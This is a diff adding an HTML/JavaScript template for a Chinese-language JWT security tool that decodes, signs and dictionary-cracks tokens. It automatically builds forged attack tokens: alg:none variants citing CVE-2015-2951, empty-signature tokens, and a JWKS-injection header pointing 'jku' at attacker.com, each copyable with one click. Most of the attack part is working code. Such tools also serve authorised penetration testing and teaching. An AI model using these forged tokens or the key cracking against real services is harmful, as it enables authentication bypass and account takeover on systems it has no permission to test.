@@ -1,0 +1,939 @@
+{% extends "base.html" %}
+
+{% block content %}
+<style>
+.jwt-wrap {
+  padding: 15px;
+}
+
+.token-card {
+  background: #fff;
+  border-radius: 8px;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+  margin-bottom: 15px;
+}
+
+.token-header {
+  background: #00e5ff;
+  color: #fff;
+  padding: 12px 15px;
+  border-radius: 12px 12px 0 0;
+  font-weight: 600;
+  font-size: 0.95rem;
+}
+
+.token-body {
+  padding: 15px;
+}
+
+.token-input {
+  width: 100%;
+  min-height: 60px;
+  padding: 10px 12px;
+  border: 1px solid #dee2e6;
+  border-radius: 8px;
+  font-family: monospace;
+  font-size: 0.85rem;
+  resize: vertical;
+}
+
+.token-input:focus {
+  outline: none;
+  border-color: #00e5ff;
+}
+
+.token-btns {
+  display: flex;
+  gap: 8px;
+  margin-top: 10px;
+}
+
+.main-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr 1fr;
+  gap: 15px;
+}
+
+@media (max-width: 1200px) {
+  .main-grid {
+    grid-template-columns: 1fr 1fr;
+  }
+}
+
+@media (max-width: 768px) {
+  .main-grid {
+    grid-template-columns: 1fr;
+  }
+}
+
+.card {
+  background: #fff;
+  border-radius: 8px;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+}
+
+.card-header {
+  background: #00e5ff;
+  color: #fff;
+  padding: 10px 15px;
+  border-radius: 12px 12px 0 0;
+  font-weight: 600;
+  font-size: 0.9rem;
+}
+
+.card-body {
+  padding: 12px 15px;
+}
+
+.form-group {
+  margin-bottom: 10px;
+}
+
+.form-label {
+  font-size: 0.8rem;
+  font-weight: 600;
+  color: #333;
+  margin-bottom: 4px;
+  display: block;
+}
+
+.form-input, .form-select {
+  width: 100%;
+  padding: 8px 10px;
+  border: 1px solid #dee2e6;
+  border-radius: 8px;
+  font-size: 0.85rem;
+}
+
+.form-input:focus, .form-select:focus {
+  outline: none;
+  border-color: #00e5ff;
+}
+
+.form-textarea {
+  width: 100%;
+  padding: 8px 10px;
+  border: 1px solid #dee2e6;
+  border-radius: 8px;
+  font-family: monospace;
+  font-size: 0.8rem;
+  resize: vertical;
+  min-height: 60px;
+}
+
+.form-textarea:focus {
+  outline: none;
+  border-color: #00e5ff;
+}
+
+.form-row {
+  display: flex;
+  gap: 10px;
+}
+
+.form-row .form-group {
+  flex: 1;
+}
+
+.btn {
+  padding: 7px 14px;
+  border: none;
+  border-radius: 8px;
+  font-size: 0.85rem;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.btn-primary { background: #00e5ff; color: #fff; }
+.btn-primary:hover { background: #0066b3; }
+.btn-success { background: #28a745; color: #fff; }
+.btn-success:hover { background: #218838; }
+.btn-danger { background: #dc3545; color: #fff; }
+.btn-danger:hover { background: #c82333; }
+.btn-outline { background: #fff; border: 1px solid #dee2e6; color: #666; }
+.btn-outline:hover { border-color: #00e5ff; color: #00e5ff; }
+
+.btn-group {
+  display: flex;
+  gap: 6px;
+  flex-wrap: wrap;
+  margin-top: 8px;
+}
+
+.algo-btns {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 5px;
+}
+
+.algo-btn {
+  padding: 5px 12px;
+  border: 1px solid #dee2e6;
+  border-radius: 15px;
+  background: #fff;
+  font-size: 0.8rem;
+  cursor: pointer;
+}
+
+.algo-btn:hover { border-color: #00e5ff; }
+.algo-btn.active {
+  background: #00e5ff;
+  color: #fff;
+  border-color: #00e5ff;
+}
+
+.decode-item {
+  margin-bottom: 8px;
+}
+
+.decode-label {
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: #666;
+  margin-bottom: 3px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.decode-label .copy-btn {
+  padding: 2px 8px;
+  font-size: 0.7rem;
+  background: #f0f0f0;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  color: #666;
+}
+
+.decode-label .copy-btn:hover {
+  background: #00e5ff;
+  color: #fff;
+}
+
+.decode-content {
+  background: #f8f9fa;
+  border: 1px solid #e9ecef;
+  border-radius: 8px;
+  padding: 8px;
+  font-family: monospace;
+  font-size: 0.75rem;
+  min-height: 40px;
+  max-height: 80px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+  color: #333;
+}
+
+.decode-content.empty {
+  color: #999;
+  font-style: italic;
+}
+
+.output-box {
+  background: #1a1a2e;
+  color: #a6e3a1;
+  border-radius: 8px;
+  padding: 8px;
+  font-family: monospace;
+  font-size: 0.75rem;
+  word-break: break-all;
+  min-height: 40px;
+  max-height: 80px;
+  overflow-y: auto;
+}
+
+/* 漏洞检测结果 */
+.vuln-section {
+  margin-top: 12px;
+  padding-top: 12px;
+  border-top: 1px solid #f0f0f0;
+}
+
+.vuln-title {
+  font-size: 0.8rem;
+  font-weight: 600;
+  color: #dc3545;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+  gap: 5px;
+}
+
+.vuln-item {
+  background: #fff5f5;
+  border: 1px solid #ffcdd2;
+  border-radius: 8px;
+  padding: 8px 10px;
+  margin-bottom: 6px;
+}
+
+.vuln-item-header {
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: #c62828;
+  margin-bottom: 4px;
+}
+
+.vuln-item-desc {
+  font-size: 0.7rem;
+  color: #666;
+  margin-bottom: 4px;
+}
+
+.vuln-item-jwt {
+  font-family: monospace;
+  font-size: 0.65rem;
+  color: #333;
+  background: #f8f9fa;
+  padding: 4px 6px;
+  border-radius: 8px;
+  word-break: break-all;
+  line-height: 1.4;
+}
+
+.vuln-item-jwt .label {
+  color: #00e5ff;
+  font-weight: 600;
+}
+
+.upload-box {
+  border: 2px dashed #dee2e6;
+  border-radius: 8px;
+  padding: 15px;
+  text-align: center;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.upload-box:hover { border-color: #00e5ff; }
+.upload-box.dragover { border-color: #00e5ff; background: #f0f7ff; }
+
+.file-info {
+  font-size: 0.8rem;
+  color: #28a745;
+  margin-top: 6px;
+}
+
+.progress-bar {
+  height: 6px;
+  background: #e9ecef;
+  border-radius: 8px;
+  overflow: hidden;
+}
+
+.progress-fill {
+  height: 100%;
+  background: #00e5ff;
+  transition: width 0.3s;
+}
+
+.progress-text {
+  font-size: 0.75rem;
+  color: #666;
+  text-align: center;
+  margin-top: 4px;
+}
+
+.success-box {
+  background: #d4edda;
+  border: 1px solid #c3e6cb;
+  border-radius: 8px;
+  padding: 10px;
+  margin-top: 10px;
+}
+
+.success-box .title {
+  font-weight: 600;
+  color: #155724;
+  font-size: 0.85rem;
+}
+
+.success-box .value {
+  font-family: monospace;
+  color: #155724;
+  font-size: 0.9rem;
+  word-break: break-all;
+  margin-top: 3px;
+}
+
+.attack-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 6px;
+}
+
+.attack-btn {
+  padding: 10px;
+  border: 1px solid var(--border-mid);
+  border-radius: 8px;
+  background: var(--bg-input);
+  color: var(--text-normal);
+  cursor: pointer;
+  text-align: center;
+  transition: all 0.2s;
+}
+
+.attack-btn:hover { border-color: var(--primary-color); background: var(--bg-hover2); color: var(--primary-hover); }
+.attack-btn h4 { margin: 0 0 2px 0; font-size: 0.8rem; color: inherit; }
+.attack-btn p { margin: 0; font-size: 0.7rem; color: var(--text-dim); }
+
+.toast {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  background: rgba(0, 158, 118, 0.15);
+  color: #009e76;
+  border-left: 4px solid #009e76;
+  padding: 10px 15px;
+  border-radius: 6px;
+  font-size: 0.9rem;
+  z-index: 1000;
+  display: none;
+}
+</style>
+
+<div class="container-fluid jwt-wrap">
+  <div class="token-card">
+    <div class="token-header"><i class="bi bi-key-fill me-2"></i>JWT Token</div>
+    <div class="token-body">
+      <textarea class="token-input" id="tokenInput" placeholder="粘贴JWT Token..."></textarea>
+      <div class="token-btns">
+        <button class="btn btn-primary" type="button" onclick="decodeJWT()"><i class="bi bi-search me-1"></i>解码</button>
+        <button class="btn btn-outline" type="button" onclick="clearAll()"><i class="bi bi-x-lg me-1"></i>清空</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-grid">
+    <!-- 第一栏：生成JWT -->
+    <div class="card">
+      <div class="card-header"><i class="bi bi-plus-circle me-2"></i>生成JWT</div>
+      <div class="card-body">
+        <div class="form-group">
+          <label class="form-label">算法</label>
+          <div class="algo-btns" id="algoBtns">
+            <button class="algo-btn active" data-algo="HS256">HS256</button>
+            <button class="algo-btn" data-algo="HS384">HS384</button>
+            <button class="algo-btn" data-algo="HS512">HS512</button>
+            <button class="algo-btn" data-algo="RS256">RS256</button>
+            <button class="algo-btn" data-algo="RS384">RS384</button>
+            <button class="algo-btn" data-algo="RS512">RS512</button>
+            <button class="algo-btn" data-algo="ES256">ES256</button>
+            <button class="algo-btn" data-algo="ES384">ES384</button>
+            <button class="algo-btn" data-algo="ES512">ES512</button>
+            <button class="algo-btn" data-algo="PS256">PS256</button>
+            <button class="algo-btn" data-algo="PS384">PS384</button>
+            <button class="algo-btn" data-algo="PS512">PS512</button>
+            <button class="algo-btn" data-algo="Ed25519">Ed25519</button>
+            <button class="algo-btn" data-algo="Ed448">Ed448</button>
+            <button class="algo-btn" data-algo="none">none</button>
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Header</label>
+          <textarea class="form-textarea" id="encodeHeader" style="min-height:50px">{"alg":"HS256","typ":"JWT"}</textarea>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Payload</label>
+          <textarea class="form-textarea" id="encodePayload" style="min-height:60px">{"sub":"1234567890","name":"John Doe","iat":1516239022}</textarea>
+        </div>
+        <div class="form-group">
+          <label class="form-label">密钥</label>
+          <input type="text" class="form-input" id="encodeSecret" placeholder="输入密钥...">
+          <div id="keyHint" style="display:none;font-size:0.7rem;color:#666;margin-top:4px">
+            RSA/EC/EdDSA算法需输入PEM格式私钥，或留空自动生成
+          </div>
+        </div>
+        <div class="btn-group">
+          <button class="btn btn-primary" type="button" onclick="encodeJWT()"><i class="bi bi-hammer me-1"></i>生成</button>
+          <button class="btn btn-outline" type="button" onclick="loadFromDecode()"><i class="bi bi-download me-1"></i>加载</button>
+        </div>
+        <div id="encodeResult" style="display:none;margin-top:10px">
+          <label class="form-label">生成的Token</label>
+          <div class="output-box" id="encodeOutput"></div>
+          <div class="btn-group">
+            <button class="btn btn-success btn-sm" type="button" onclick="copyEncoded()"><i class="bi bi-clipboard me-1"></i><i class="bi bi-clipboard" title="复制"></i></button>
+            <button class="btn btn-outline btn-sm" type="button" onclick="useEncoded()"><i class="bi bi-arrow-repeat me-1"></i>使用</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 第二栏：解码结果 + 漏洞检测 -->
+    <div class="card">
+      <div class="card-header"><i class="bi bi-file-code me-2"></i>解码结果</div>
+      <div class="card-body">
+        <div class="decode-item">
+          <div class="decode-label">
+            <span>Header</span>
+            <button class="copy-btn" type="button" onclick="copyDecode('header')"><i class="bi bi-clipboard" title="复制"></i></button>
+          </div>
+          <div class="decode-content empty" id="headerPart">等待解码...</div>
+        </div>
+        <div class="decode-item">
+          <div class="decode-label">
+            <span>Payload</span>
+            <button class="copy-btn" type="button" onclick="copyDecode('payload')"><i class="bi bi-clipboard" title="复制"></i></button>
+          </div>
+          <div class="decode-content empty" id="payloadPart">等待解码...</div>
+        </div>
+        <div class="decode-item">
+          <div class="decode-label"><span>Signature</span></div>
+          <div class="decode-content empty" id="signaturePart">等待解码...</div>
+        </div>
+
+        <!-- 漏洞检测结果 -->
+        <div class="vuln-section" id="vulnSection" style="display:none">
+          <div class="vuln-title"><i class="bi bi-shield-exclamation"></i> 安全漏洞检测</div>
+          <div id="vulnList"></div>
+        </div>
+
+        <!-- 算法信息 -->
+        <div class="decode-item" id="algoInfo" style="display:none;margin-top:10px">
+          <div class="decode-label"><span>检测到的算法</span></div>
+          <div class="decode-content" id="algoInfoContent"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 第三栏：破解 + 攻击 -->
+    <div class="card">
+      <div class="card-header"><i class="bi bi-shield-x me-2"></i>破解 & 攻击</div>
+      <div class="card-body">
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">字典</label>
+            <select class="form-select" id="dictionarySelect">
+              <option value="common">常用(~80)</option>
+              <option value="top100">Top100</option>
+              <option value="upload">上传</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label class="form-label">编码</label>
+            <select class="form-select" id="secretEncoding">
+              <option value="utf8">UTF-8</option>
+              <option value="base64">Base64</option>
+              <option value="hex">Hex</option>
+              <option value="latin1">Latin-1</option>
+            </select>
+          </div>
+        </div>
+
+        <div id="uploadWrap" style="display:none;margin-bottom:10px">
+          <div class="upload-box" id="uploadBox">
+            <input type="file" id="dictFile" accept=".txt,.dict" style="display:none">
+            <div><i class="bi bi-cloud-upload" style="font-size:1.5rem;color:#00e5ff"></i></div>
+            <div style="font-size:0.8rem;margin-top:5px">点击或拖拽文件 (≤5MB)</div>
+          </div>
+          <div class="file-info" id="fileInfo" style="display:none"></div>
+        </div>
+
+        <div class="btn-group">
+          <button class="btn btn-danger" type="button" onclick="startCrack()"><i class="bi bi-lightning me-1"></i>破解</button>
+          <button class="btn btn-outline" type="button" onclick="stopCrack()">停止</button>
+        </div>
+
+        <div id="crackProgress" style="display:none;margin-top:10px">
+          <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:0%"></div></div>
+          <div class="progress-text" id="progressText">准备中...</div>
+        </div>
+
+        <div class="success-box" id="crackResult" style="display:none">
+          <div class="title"><i class="bi bi-check-circle-fill me-1"></i>破解成功!</div>
+          <div class="value" id="crackedSecret"></div>
+          <button class="btn btn-success btn-sm" style="margin-top:8px" type="button" onclick="useCrackedSecret()"><i class="bi bi-arrow-down-circle me-1"></i>使用密钥</button>
+        </div>
+
+        <hr style="border:none;border-top:1px solid #f0f0f0;margin:12px 0">
+
+        <label class="form-label">攻击测试</label>
+        <div class="attack-grid">
+          <div class="attack-btn" id="attackNoneBtn"><h4>Alg:None</h4><p>复制攻击Token</p></div>
+          <div class="attack-btn" id="attackEmptyBtn"><h4>空签名</h4><p>复制攻击Token</p></div>
+          <div class="attack-btn" id="attackJwksBtn"><h4>JWKS注入</h4><p>复制攻击Token</p></div>
+          <div class="attack-btn" id="attackWeakBtn"><h4>弱密钥</h4><p>弱密钥爆破</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function base64UrlDecode(str) {
+  str = str.replace(/-/g, '+').replace(/_/g, '/');
+  while (str.length % 4) str += '=';
+  return atob(str);
+}
+
+function base64UrlEncode(str) {
+  return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
+let selectedAlgo = 'HS256';
+let cracking = false;
+let decodedData = null;
+let vulnTokens = [];
+
+function decodeJWT() {
+  const token = document.getElementById('tokenInput').value.trim();
+  if (!token) { showToast('请输入JWT Token'); return; }
+  const parts = token.split('.');
+  if (parts.length !== 3) {
+    if (token.startsWith('.') || token.length > 50) {
+      showToast('这是Flask Session Cookie，不是JWT Token');
+    } else {
+      showToast('无效的JWT格式');
+    }
+    return;
+  }
+  try {
+    const header = JSON.parse(base64UrlDecode(parts[0]));
+    const payload = JSON.parse(base64UrlDecode(parts[1]));
+    decodedData = { header, payload, signature: parts[2], token };
+    document.getElementById('headerPart').textContent = JSON.stringify(header, null, 2);
+    document.getElementById('headerPart').classList.remove('empty');
+    document.getElementById('payloadPart').textContent = JSON.stringify(payload, null, 2);
+    document.getElementById('payloadPart').classList.remove('empty');
+    document.getElementById('signaturePart').textContent = parts[2];
+    document.getElementById('signaturePart').classList.remove('empty');
+
+    // 显示算法信息
+    const algoInfo = document.getElementById('algoInfo');
+    const algoInfoContent = document.getElementById('algoInfoContent');
+    const algoDesc = {
+      'none': '无签名 - Token未签名，任何人可伪造',
+      'HS256': 'HMAC-SHA256 - 对称密钥，使用共享密钥签名和验证',
+      'HS384': 'HMAC-SHA384 - 对称密钥，使用共享密钥签名和验证',
+      'HS512': 'HMAC-SHA512 - 对称密钥，使用共享密钥签名和验证',
+      'RS256': 'RSA PKCS#1 v1.5 + SHA-256 - 非对称密钥，使用RSA私钥签名',
+      'RS384': 'RSA PKCS#1 v1.5 + SHA-384 - 非对称密钥，使用RSA私钥签名',
+      'RS512': 'RSA PKCS#1 v1.5 + SHA-512 - 非对称密钥，使用RSA私钥签名',
+      'ES256': 'ECDSA + P-256 + SHA-256 - 椭圆曲线签名',
+      'ES384': 'ECDSA + P-384 + SHA-384 - 椭圆曲线签名',
+      'ES512': 'ECDSA + P-521 + SHA-512 - 椭圆曲线签名',
+      'PS256': 'RSA PSS + SHA-256 - RSA概率签名方案',
+      'PS384': 'RSA PSS + SHA-384 - RSA概率签名方案',
+      'PS512': 'RSA PSS + SHA-512 - RSA概率签名方案',
+      'Ed25519': 'EdDSA + Ed25519 - Edwards曲线数字签名',
+      'Ed448': 'EdDSA + Ed448 - Edwards曲线数字签名'
+    };
+    const algo = header.alg || 'unknown';
+    algoInfoContent.textContent = `${algo} - ${algoDesc[algo] || '未知算法'}`;
+    algoInfo.style.display = 'block';
+
+    // 漏洞检测
+    detectVulns(header, payload, parts);
+    showToast('解码成功');
+  } catch (e) { showToast('解码失败: ' + e.message); }
+}
+
+function detectVulns(header, payload, parts) {
+  const payloadB64 = parts[1];
+  const payloadJson = JSON.stringify(payload);
+  vulnTokens = [];
+  let vulnHtml = '';
+
+  function escapeHtml(str) {
+    return str.replace(/&/g,'&amp;').replace(/'/g,'&#39;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  function addVulnItem(title, token) {
+    vulnTokens.push(token);
+    const idx = vulnTokens.length - 1;
+    const safeToken = escapeHtml(token);
+    vulnHtml += `
+      <div class="vuln-item">
+        <div class="vuln-item-header">${escapeHtml(title)}</div>
+        <div class="vuln-item-jwt"><span class="label">JWT:</span> ${safeToken}</div>
+        <button class="btn btn-success btn-sm" style="margin-top:5px" type="button" onclick="copyToClipboard(vulnTokens[${idx}], '攻击 Token')"><i class="bi bi-clipboard me-1"></i>复制Token</button>
+      </div>`;
+  }
+
+  // 1-4: CVE-2015-2951 Alg: None攻击
+  const noneAlgs = ['none', 'None', 'NoNe', 'NONE'];
+  noneAlgs.forEach((alg, i) => {
+    const newHeader = {alg: alg, typ: 'JWT'};
+    const headerB64 = base64UrlEncode(JSON.stringify(newHeader));
+    addVulnItem(`漏洞 ${i+1}: CVE-2015-2951 将alg修改为${alg}的攻击`, `${headerB64}.${payloadB64}.`);
+  });
+
+  // 5: 未验证签名攻击 (保持原签名)
+  addVulnItem('漏洞 5: 未验证签名攻击 修改Payload不校验签名', `${parts[0]}.${parts[1]}.${parts[2]}`);
+
+  // 6: CVE-2018-0114 JWKS公钥注入
+  const jwksHeader = {
+    alg: 'RS256',
+    jku: 'https://attacker.com/jwks.json',
+    kid: 'fake-key-id'
+  };
+  const jwksHeaderB64 = base64UrlEncode(JSON.stringify(jwksHeader));
+  const fakeSig = 'B0fErubb4YkkLZwK0zmXizfIWtElG0tpl7CHCu0vpLGkUZXMnX6oa5WH5WATWm5xrB9s3oXi8pdGQrT4r9hDJqOFznEna43u7tCSvbn7gMDSH-6fSfhmKigkie2VfG_P0bRxMsSNqDrphP_ep-CXEF4wIT2hNI8qIorU38s3tkPscELxy6blVbYCLKb5KuSnQTFl3OJJM7d6rGXyACRvZLoTmDtXPpTaM1rRHqd8zJl94lp-qLfkQwP6HK3Ti3M9M4jtLmIkdqt0Tcs0N5k3pPr2eB2osPqF6jsxmbJuaafbyhWh7keiysKHFIvocrRnlPd1C6hBBtvl9eVGFy9n8g';
+  addVulnItem('漏洞 6: CVE-2018-0114 JWKS公钥注入伪造密钥攻击', `${jwksHeaderB64}.${payloadB64}.${fakeSig}`);
+
+  // 7: CVE-2020-28042 空签名攻击
+  addVulnItem('漏洞 7: CVE-2020-28042 空签名攻击', `${parts[0]}.${payloadB64}.`);
+
+  document.getElementById('vulnList').innerHTML = vulnHtml;
+  document.getElementById('vulnSection').style.display = 'block';
+}
+
+function clearAll() {
+  document.getElementById('tokenInput').value = '';
+  document.getElementById('headerPart').textContent = '等待解码...';
+  document.getElementById('headerPart').classList.add('empty');
+  document.getElementById('payloadPart').textContent = '等待解码...';
+  document.getElementById('payloadPart').classList.add('empty');
+  document.getElementById('signaturePart').textContent = '等待解码...';
+  document.getElementById('signaturePart').classList.add('empty');
+  document.getElementById('vulnSection').style.display = 'none';
+  document.getElementById('encodeResult').style.display = 'none';
+  document.getElementById('crackProgress').style.display = 'none';
+  document.getElementById('crackResult').style.display = 'none';
+  document.getElementById('algoInfo').style.display = 'none';
+  decodedData = null;
+  vulnTokens = [];
+}
+
+function copyDecode(part) {
+  const el = document.getElementById(part === 'header' ? 'headerPart' : 'payloadPart');
+  const text = el.textContent;
+  if (text && text !== '等待解码...') {
+    copyToClipboard(text, part === 'header' ? 'Header' : 'Payload');
+  } else { showToast('暂无内容'); }
+}
+
+async function encodeJWT() {
+  try {
+    const header = JSON.parse(document.getElementById('encodeHeader').value);
+    const payload = JSON.parse(document.getElementById('encodePayload').value);
+    const secret = document.getElementById('encodeSecret').value;
+    const res = await fetch('/jwt-generate', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ header, payload, secret })
+    });
+    const r = await res.json();
+    if (r.success) {
+      document.getElementById('encodeOutput').textContent = r.token;
+      document.getElementById('encodeResult').style.display = 'block';
+      showToast('生成成功');
+    } else { showToast('失败: ' + r.error); }
+  } catch (e) { showToast('失败: ' + e.message); }
+}
+
+function loadFromDecode() {
+  if (decodedData) {
+    document.getElementById('encodeHeader').value = JSON.stringify(decodedData.header, null, 2);
+    document.getElementById('encodePayload').value = JSON.stringify(decodedData.payload, null, 2);
+    showToast('已加载');
+  } else { showToast('请先解码'); }
+}
+
+function copyEncoded() {
+  copyToClipboard(document.getElementById('encodeOutput').textContent, '编码结果');
+}
+
+function useEncoded() {
+  document.getElementById('tokenInput').value = document.getElementById('encodeOutput').textContent;
+  decodeJWT();
+}
+
+function updateHeader() {
+  try {
+    const h = JSON.parse(document.getElementById('encodeHeader').value || '{}');
+    h.alg = selectedAlgo;
+    if (selectedAlgo !== 'none') h.typ = 'JWT';
+    document.getElementById('encodeHeader').value = JSON.stringify(h, null, 2);
+    // 显示密钥格式提示
+    const isAsym = selectedAlgo.startsWith('RS') || selectedAlgo.startsWith('ES') || selectedAlgo.startsWith('PS') || selectedAlgo.startsWith('Ed');
+    document.getElementById('keyHint').style.display = isAsym ? 'block' : 'none';
+  } catch(e) {}
+}
+
+async function startCrack() {
+  const token = document.getElementById('tokenInput').value.trim();
+  if (!token) { showToast('请输入JWT Token'); return; }
+  const parts = token.split('.');
+  if (parts.length !== 3) { showToast('无效格式'); return; }
+
+  // 检查算法是否支持暴力破解
+  try {
+    const header = JSON.parse(base64UrlDecode(parts[0]));
+    const algo = header.alg || '';
+    if (!algo.startsWith('HS') && algo !== 'none') {
+      showToast(`${algo}算法不支持暴力破解，仅支持HMAC系列`);
+      return;
+    }
+  } catch(e) { showToast('无法解析Header'); return; }
+
+  const dictType = document.getElementById('dictionarySelect').value;
+  const encoding = document.getElementById('secretEncoding').value;
+
+  if (dictType === 'upload') {
+    const f = document.getElementById('dictFile');
+    if (!f.files || !f.files[0]) { showToast('请选择文件'); return; }
+    cracking = true;
+    document.getElementById('crackProgress').style.display = 'block';
+    document.getElementById('crackResult').style.display = 'none';
+    document.getElementById('progressFill').style.width = '0%';
+    document.getElementById('progressText').textContent = '上传中...';
+    const fd = new FormData();
+    fd.append('token', token);
+    fd.append('dict_file', f.files[0]);
+    fd.append('encoding', encoding);
+    try {
+      const res = await fetch('/jwt-crack-file', { method: 'POST', body: fd });
+      if (!cracking) { document.getElementById('progressText').textContent = '已停止'; return; }
+      handleResult(await res.json());
+    } catch (e) { document.getElementById('progressText').textContent = '失败: ' + e.message; }
+    cracking = false;
+    return;
+  }
+
+  cracking = true;
+  document.getElementById('crackProgress').style.display = 'block';
+  document.getElementById('crackResult').style.display = 'none';
+  document.getElementById('progressFill').style.width = '0%';
+  document.getElementById('progressText').textContent = '破解中...';
+  try {
+    const res = await fetch('/jwt-crack', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ token, dict_type: dictType, encoding })
+    });
+    if (!cracking) { document.getElementById('progressText').textContent = '已停止'; return; }
+    handleResult(await res.json());
+  } catch (e) { document.getElementById('progressText').textContent = '失败: ' + e.message; }
+  cracking = false;
+}
+
+function handleResult(r) {
+  if (r.success) {
+    document.getElementById('progressFill').style.width = '100%';
+    document.getElementById('progressText').textContent = `完成，尝试 ${r.tried || r.total} 个`;
+    if (r.found) {
+      document.getElementById('crackedSecret').textContent = r.secret;
+      document.getElementById('crackResult').style.display = 'block';
+    } else { document.getElementById('progressText').textContent = '未找到密钥'; }
+  } else { document.getElementById('progressText').textContent = '错误: ' + r.error; }
+}
+
+function stopCrack() { cracking = false; document.getElementById('progressText').textContent = '已停止'; }
+function useCrackedSecret() { document.getElementById('encodeSecret').value = document.getElementById('crackedSecret').textContent; showToast('已填入'); }
+function attackWeakKey() {
+  const token = document.getElementById('tokenInput').value.trim();
+  if (!token) {
+    showToast('请输入JWT Token');
+    return;
+  }
+  // 自动选择常用字典并开始破解
+  document.getElementById('dictionarySelect').value = 'common';
+  startCrack();
+}
+function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.style.display = 'block'; setTimeout(() => t.style.display = 'none', 2000); }
+
+function copyToClipboard(text, label) {
+  if (!text) { showToast('没有内容可复制'); return; }
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(() => {
+      showToast(`${label || '内容'}已复制`);
+    }).catch(() => {
+      fallbackCopy(text, label);
+    });
+  } else {
+    fallbackCopy(text, label);
+  }
+}
+
+function fallbackCopy(text, label) {
+  const textarea = document.createElement('textarea');
+  textarea.value = text;
+  textarea.style.position = 'fixed';
+  textarea.style.left = '-9999px';
+  textarea.style.top = '0';
+  document.body.appendChild(textarea);
+  textarea.focus();
+  textarea.select();
+  try {
+    document.execCommand('copy');
+    showToast(`${label || '内容'}已复制`);
+  } catch (e) {
+    showToast('复制失败，请手动复制');
+  }
+  document.body.removeChild(textarea);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  document.querySelectorAll('.algo-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+      document.querySelectorAll('.algo-btn').forEach(b => b.classList.remove('active'));
+      this.classList.add('active');
+      selectedAlgo = this.dataset.algo;
+      updateHeader();
+    });
+  });
+
+  document.querySelectorAll('.attack-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+      document.querySelectorAll('.attack-btn').forEach(b => b.classList.remove('active'));
+      this.classList.add('active');
+    });
+  });
+
+  document.getElementById('dictionarySelect').addEventListener('change', function() {
+    document.getElementById('uploadWrap').style.display = this.value === 'upload' ? 'block' : 'none';
+  });
+
+  // 攻击按钮事件绑定
+  document.getElementById('attackNoneBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    const token = document.getElementById('tokenInput').value.trim();
+    if (!token) { showToast('请先输入JWT Token'); return; }
+    if (vulnTokens.length === 0) { decodeJWT(); }
+    if (vulnTokens.length > 0) copyToClipboard(vulnTokens[0], '攻击 Token');
+  });
+  document.getElementById('attackEmptyBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    const token = document.getElementById('tokenInput').value.trim();
+    if (!token) { showToast('请先输入JWT Token'); return; }
+    if (vulnTokens.length === 0) { decodeJWT(); }
+    if (vulnTokens.length >= 7) copyToClipboard(vulnTokens[6], '攻击 Token');
+  });
+  document.getElementById('attackJwksBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    const token = document.getElementById('tokenInput').value.trim();
+    if (!token) { showToast('请先输入JWT Token'); return; }
+    if (vulnTokens.length === 0) { decodeJWT(); }
+    if (vulnTokens.length >= 6) copyToClipboard(vulnTokens[5], '攻击 Token');
+  });
+  document.getElementById('attackWeakBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    attackWeakKey();
+  });
+
+  const uploadBox = document.getElementById('uploadBox');
+  const fileInput = document.getElementById('dictFile');
+  uploadBox.addEventListener('click', () => fileInput.click());
+  uploadBox.addEventListener('dragover', e => { e.preventDefault(); uploadBox.classList.add('dragover'); });
+  uploadBox.addEventListener('dragleave', () => uploadBox.classList.remove('dragover'));
+  uploadBox.addEventListener('drop', e => { e.preventDefault(); uploadBox.classList.remove('dragover'); if (e.dataTransfer.files.length) { fileInput.files = e.dataTransfer.files; handleFile(); } });
+  fileInput.addEventListener('change', handleFile);
+
+  function handleFile() {
+    const f = fileInput.files[0];
+    if (f) {
+      if (f.size > 5*1024*1024) { showToast('文件不能超过5MB'); fileInput.value = ''; return; }
+      document.getElementById('fileInfo').style.display = 'block';
+      document.getElementById('fileInfo').innerHTML = `<i class="bi bi-file-earmark me-1"></i>${f.name} (${(f.size/1024).toFixed(1)}KB)`;
+    }
+  }
+});
+</script>
+{% endblock %}
